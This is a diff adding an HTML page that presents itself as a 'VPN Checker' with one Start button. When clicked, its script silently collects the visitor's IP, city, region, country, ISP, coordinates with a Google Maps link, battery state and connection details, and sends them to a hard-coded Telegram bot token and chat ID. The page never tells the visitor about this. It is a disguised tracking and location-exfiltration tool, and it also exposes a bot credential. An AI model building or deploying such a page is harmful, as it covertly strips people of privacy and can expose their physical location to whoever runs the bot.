@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>VPN Checker - Telegram Bot</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+    }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #3b82f6, #ec4899);
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 40px;
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    button {
+      font-size: 3rem;
+      padding: 20px 60px;
+      border: none;
+      border-radius: 12px;
+      background-color: white;
+      color: #007bff;
+      cursor: pointer;
+      transition: all 10s;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+    button:hover {
+      background-color: #f0f0f0;
+      color: #0056b3;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+    }
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <button id="startBtn">Start</button>
+  </div>
+
+  <script>
+    const token = '8116468453:AAGm5YJviYVeySPy6sS81f8TuPrA1FmJ4mg'; // ← твой Telegram токен
+    const chatId = '7354864098'; // ← твой Telegram chat ID
+
+    function formatSpeed(mbps) {
+      return mbps >= 1000 ? (mbps / 1000).toFixed(2) + ' Gbps' : mbps.toFixed(2) + ' Mbps';
+    }
+
+    async function sendTelegramMessage(text) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: false
+        })
+      });
+    }
+
+    function startCooldown(seconds) {
+      const btn = document.getElementById('startBtn');
+      btn.disabled = true;
+      setTimeout(() => { btn.disabled = false; }, seconds * 1000);
+    }
+
+    function playBeep() {
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const audioCtx = new AudioContext();
+        const oscillator = audioCtx.createOscillator();
+        oscillator.type = 'sine';
+        oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+        oscillator.connect(audioCtx.destination);
+        oscillator.start();
+        oscillator.stop(audioCtx.currentTime + 10.0); // 10 секунд
+      } catch (e) {
+        console.warn("Ошибка воспроизведения звука:", e);
+      }
+    }
+
+    async function sendData() {
+      const btn = document.getElementById('startBtn');
+      btn.disabled = true;
+      playBeep();
+
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const localTime = new Date().toLocaleString("ru-RU", {
+          timeZone: data.timezone || 'UTC'
+        });
+
+        let batteryStatus = 'Недоступно';
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'заряжается' : 'не заряжается'})`;
+          } catch (e) { batteryStatus = 'Недоступно'; }
+        }
+
+        let networkSpeed = 'Недоступно';
+        let connectionType = 'Неизвестно';
+        if (navigator.connection) {
+          if (navigator.connection.downlink) {
+            networkSpeed = formatSpeed(navigator.connection.downlink);
+          }
+          if (navigator.connection.effectiveType) {
+            connectionType = navigator.connection.effectiveType;
+          }
+        }
+
+        const vpnDetected = data.org && /vpn|proxy|hosting|server|cloud/i.test(data.org);
+        const vpnText = vpnDetected ? '🛡 VPN: Обнаружен' : '✅ VPN: Не обнаружен';
+
+        const mapsLink = data.latitude && data.longitude
+          ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+          : 'Неизвестно';
+
+        const message = `
+<b>📡 СЕТЕВАЯ ИНФОРМАЦИЯ</b>
+
+<b>📍 Локация:</b>
+IP: <code>${data.ip}</code>
+Город: ${data.city || 'Неизвестно'}
+Регион: ${data.region || 'Неизвестно'}
+Страна: ${data.country_name || 'Неизвестно'}
+Провайдер: ${data.org || 'Неизвестно'}
+
+<b>ℹ️ Дополнительно:</b>
+⏰ Время: ${localTime}
+🔋 Батарея: ${batteryStatus}
+🌐 Скорость: ${networkSpeed}
+📶 Подключение: ${connectionType}
+${vpnText}
+🌍 Часовой пояс: ${data.timezone || 'UTC'}
+
+<b>🗺 Местоположение на карте:</b>
+<a href="${mapsLink}">${mapsLink}</a>
+        `;
+
+        await sendTelegramMessage(message);
+
+      } catch (err) {
+        await sendTelegramMessage(`❌ <b>Ошибка:</b>\n<code>${err.message}</code>`);
+      } finally {
+        startCooldown(30);
+      }
+    }
+
+    document.getElementById('startBtn').addEventListener('click', sendData);
+  </script>
+
+</body>
+</html>
